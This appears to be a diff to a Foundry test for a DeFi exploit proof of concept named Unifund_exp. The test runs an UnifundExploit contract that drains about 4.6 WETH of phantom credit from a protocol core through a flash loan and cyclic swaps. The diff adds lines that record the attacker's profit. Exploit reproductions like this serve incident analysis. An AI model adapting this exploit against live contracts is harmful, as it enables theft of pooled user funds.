@@ -242,6 +242,7 @@ contract Unifund_exp is Test {
     // phantom out of the core's pooled funds. The measured victim loss is the core WETH drop.
     function testExploit() public {
         uint256 coreBefore = WETH.balanceOf(CORE);
+        uint256 profitBefore = address(this).balance;
         emit log_named_decimal_uint("core WETH before", coreBefore, 18);
 
         UnifundExploit exploit = new UnifundExploit(true);
@@ -249,8 +250,12 @@ contract Unifund_exp is Test {
 
         uint256 coreAfter = WETH.balanceOf(CORE);
         uint256 drained = coreBefore - coreAfter;
+        // attack() sweeps the realized ETH (phantom payout minus the repaid flash loan) to owner,
+        // which is this test contract. Net gain is the attacker profit.
+        uint256 profit = address(this).balance - profitBefore;
         emit log_named_decimal_uint("core WETH after ", coreAfter, 18);
         emit log_named_decimal_uint("phantom drained ", drained, 18);
+        emit log_named_decimal_uint("attacker profit ", profit, 18);
 
         // The core held 4.9944 WETH (the ~4.9941 WETH headline); the single cyclic-swap group here
         // pulls ~4.628 WETH of it out as phantom credit. Assert the measured drain.
